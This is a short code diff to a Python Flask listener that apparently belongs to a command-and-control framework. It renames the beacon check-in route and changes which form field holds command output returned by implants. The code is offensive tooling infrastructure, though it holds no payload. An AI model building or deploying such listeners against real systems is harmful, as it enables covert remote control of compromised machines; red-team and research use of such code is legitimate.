@@ -49,7 +49,7 @@ class Listener:
             with open(self.encKeyPath, "rt") as f:
                 self.key = f.read()
 
-        @self.app.route("/callback", methods=['POST'])
+        @self.app.route("/byakuya", methods=['POST'])
         def beaconAdd():
             name        = ''.join(choice(ascii_uppercase) for i in range(10))
             beaconIp    = flask.request.remote_addr
@@ -74,7 +74,7 @@ class Listener:
 
         @self.app.route("/output/<name>", methods=['POST'])
         def receiveOutput(name):
-            output = flask.request.form.get("result")
+            output = flask.request.form.get("output")
             outputResults(name, output)
             return('', 204) # 204 = No Content
 
